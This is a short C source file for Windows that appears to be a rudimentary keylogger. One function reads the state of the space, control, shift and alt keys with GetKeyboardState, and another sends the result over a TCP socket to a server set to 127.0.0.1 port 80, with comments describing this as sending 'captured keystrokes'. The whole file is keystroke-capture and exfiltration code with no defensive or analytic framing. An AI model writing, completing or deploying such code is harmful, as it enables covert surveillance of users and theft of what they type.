#include <windows.h>
#include <winuser.h>
#include <winsock2.h>
#include <ws2tcpip.h>
#include <stdio.h>

#pragma comment(lib, "ws2_32.lib")

#define SERVER_ADDRESS "127.0.0.1"
#define SERVER_PORT 80

int send_data(const char *data, int length) {
    // Initialize Winsock
    WSADATA wsaData;
    if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) {
        // Error handling if WSAStartup fails
        return -1;
    }

    // Create a socket for connecting to the server
    SOCKET sockfd = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    if (sockfd == INVALID_SOCKET) {
        // Error handling if socket creation fails
        WSACleanup();
        return -1;
    }

    // Resolve the server address
    struct sockaddr_in serverAddr;
    serverAddr.sin_family = AF_INET;
    serverAddr.sin_port = htons(SERVER_PORT);
    InetPton(AF_INET, SERVER_ADDRESS, &serverAddr.sin_addr);

    // Connect to the server
    if (connect(sockfd, (struct sockaddr*)&serverAddr, sizeof(serverAddr)) != 0) {
        // Error handling if connection fails
        closesocket(sockfd);
        WSACleanup();
        return -1;
    }

    // Send the data to the server
    int bytes_sent = send(sockfd, data, length, 0);

    // Close the socket and clean up
    closesocket(sockfd);
    WSACleanup();

    // Return the number of bytes sent
    return bytes_sent;
}

int get_keyboard_state() {
    SHORT result = 0;
    BYTE keyboard_state[256];

    // Get the current state of the keyboard
    if (!GetKeyboardState(keyboard_state)) {
        // Error handling if GetKeyboardState fails
        return -1;
    }

    // Check if the key with virtual-key code VK_SPACE is pressed
    if (keyboard_state[VK_SPACE] & 0x80) {
        result |= 1;
    }

    // Check if the key with virtual-key code VK_CONTROL is pressed
    if (keyboard_state[VK_CONTROL] & 0x80) {
        result |= 2;
    }

    // Check if the key with virtual-key code VK_SHIFT is pressed
    if (keyboard_state[VK_SHIFT] & 0x80) {
        result |= 4;
    }

    // Check if the key with virtual-key code VK_MENU is pressed
    if (keyboard_state[VK_MENU] & 0x80) {
        result |= 8;
    }

    // Send the captured keystrokes to the server
    char keystrokes[16];
    sprintf(keystrokes, "%d\n", result);
    send_data(keystrokes, strlen(keystrokes));

    // Return the result as a bitfield with 4 bits
    return result;
}
